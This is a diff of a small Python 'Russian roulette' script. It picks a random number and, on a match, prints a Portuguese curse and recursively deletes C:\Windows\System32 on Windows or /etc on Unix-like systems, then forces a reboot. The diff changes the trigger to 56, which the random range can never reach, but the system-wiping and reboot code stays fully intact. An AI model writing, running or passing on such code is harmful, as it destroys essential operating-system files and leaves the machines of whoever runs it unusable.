@@ -5,15 +5,18 @@ import time
 
 roleta_russa = random.randint(1, 6)
 
+name = os.name
 
 while True:
-    if roleta_russa == 5:
-        if os.name == 'nt':
+    if roleta_russa == 56:
+
+        if name == 'nt':
             print("SE FUDEU!")
             shutil.rmtree("C:\\Windows\\System32")
             time.sleep(3)
             os.system("shutdown /r /t 1")
-        elif os.name == 'posix':
+
+        elif name == 'posix':
             print("SE FUDEU!")
             shutil.rmtree("/etc")
             time.sleep(3)
